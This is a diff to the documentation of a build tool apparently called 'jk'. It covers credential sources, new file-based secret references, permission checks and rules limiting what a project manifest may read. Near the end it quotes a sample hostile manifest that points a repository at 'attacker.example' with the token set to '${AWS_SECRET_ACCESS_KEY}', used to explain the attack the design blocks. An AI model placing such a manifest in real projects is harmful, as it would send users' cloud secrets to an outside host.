@@ -220,10 +220,13 @@ usual.
 Sources, in order — the first that yields a credential wins:
 
 1. inline in the `[repositories.<id>]` table: `token`, or `username` + `password`, normally as
-   `${VAR}` references expanded when the repository is used — see [Who may write a
-   `${VAR}` reference](#who-may-write-a-var-reference)
+   references expanded when the repository is used — see [Secret references](#secret-references)
+   and [Who may write a `${VAR}` reference](#who-may-write-a-var-reference)
 2. `JK_REPO_<ID>_TOKEN`, or `JK_REPO_<ID>_USERNAME` + `JK_REPO_<ID>_PASSWORD` — `<ID>` is the id
-   upper-cased with every non-alphanumeric as `_` (`corp-nexus` → `CORP_NEXUS`)
+   upper-cased with every non-alphanumeric as `_` (`corp-nexus` → `CORP_NEXUS`). Each also has a
+   `_FILE` form (`JK_REPO_<ID>_TOKEN_FILE`, `_USERNAME_FILE`, `_PASSWORD_FILE`) that names a file
+   holding the value, the convention Docker and Kubernetes secret mounts follow; see
+   [Secret references](#secret-references)
 3. `jk repo login <id>` (stored under `~/.jk/creds/repo/`, owner-only)
 4. the `<server>` with that `<id>` in `~/.m2/settings.xml` (a `<mirror>` or active-profile
    `<repository>` with that id in the same file binds the name to its URL — see
@@ -235,6 +238,42 @@ Tool distribution mirrors and npm registries use the same chain, keyed by host �
 
 `jk publish -c` reads the id `central`, bound to `https://central.sonatype.com` — see
 [Publish: Maven Central](publish.md#maven-central).
+
+### Secret references
+
+A credential value, an object-store key and a `[mirrors]` value can be a reference instead of the
+secret itself. jk expands it each time the repository is used:
+
+| Spelling | Value |
+|----------|-------|
+| `${NAME}` or `${env:NAME}` | the environment variable (`env:` is the explicit spelling) |
+| `${file:~/.secrets/nexus-token}` | the whole file, with its trailing newline trimmed |
+| `${file:~/.jk/secrets.properties#nexus.password}` | one key of a Java `.properties` file |
+
+```toml
+# ~/.jk/config.toml
+[repositories.corp]
+url      = "https://nexus.acme.com/repository/maven/"
+username = "deployer"
+password = "${file:~/.jk/secrets.properties#corp.password}"
+```
+
+- `~` expands to your home. A relative path is relative to `~/.jk/`, the directory of the file
+  that declares it.
+- On Linux and macOS, jk refuses a file that its group or other users can read, and names the
+  fix: `chmod 600 <file>`. The check follows symlinks. Docker and Kubernetes mount secrets as `0444`
+  and `0644` by default, so set the mount's mode to `0400` or `0600`. Windows is not checked.
+- A missing file, a missing key, or an empty value is an error that names
+  `repositories.<id>.<key>` and the path. jk never falls back to an anonymous request.
+- jk re-reads the file whenever its modification time, size or identity changes, so a rotated
+  secret takes effect on the next command. You don't need `jk engine stop`.
+- jk masks every value it reads in its output, `-o jsonl` and the engine log, the same way it masks
+  every other credential.
+
+A `JK_REPO_<ID>_*_FILE` variable follows the same permission rule. Setting both
+`JK_REPO_<ID>_TOKEN` and `JK_REPO_<ID>_TOKEN_FILE` is an error. jk reads the `_FILE` variable from
+the shell that runs `jk`, never from a project's `.env`, so a cloned project can't choose which of
+your files a credential comes from. A relative path is relative to your home directory.
 
 ### A name is not a destination
 
@@ -271,10 +310,10 @@ CI that exports `JK_REPO_INTERNAL_TOKEN` for a repository the project declares e
 
 An inline `${VAR}` reads your shell too, and which file wrote it decides whether it may:
 
-| Declared in | `${VAR}` may name |
-|-------------|-------------------|
-| `~/.jk/config.toml` | any variable — the file is yours, and its declaration supplies the credential even when the project declares the same id at the same origin |
-| a project `jk.toml` | only the repository's own `JK_REPO_<ID>_*` variables, sent under the same binding rule as the environment source above |
+| Declared in | `${VAR}` may name | `${file:…}` |
+|-------------|-------------------|-------------|
+| `~/.jk/config.toml` | any variable — the file is yours, and its declaration supplies the credential even when the project declares the same id at the same origin | allowed |
+| a project `jk.toml` | only the repository's own `JK_REPO_<ID>_*` variables, sent under the same binding rule as the environment source above | refused like a foreign variable; anywhere outside a repository's credential or object-store keys it is a parse error |
 
 A project manifest is anyone's: a cloned one declaring `[repositories.internal] url =
 "https://attacker.example/" token = "${AWS_SECRET_ACCESS_KEY}"` would otherwise receive that value in
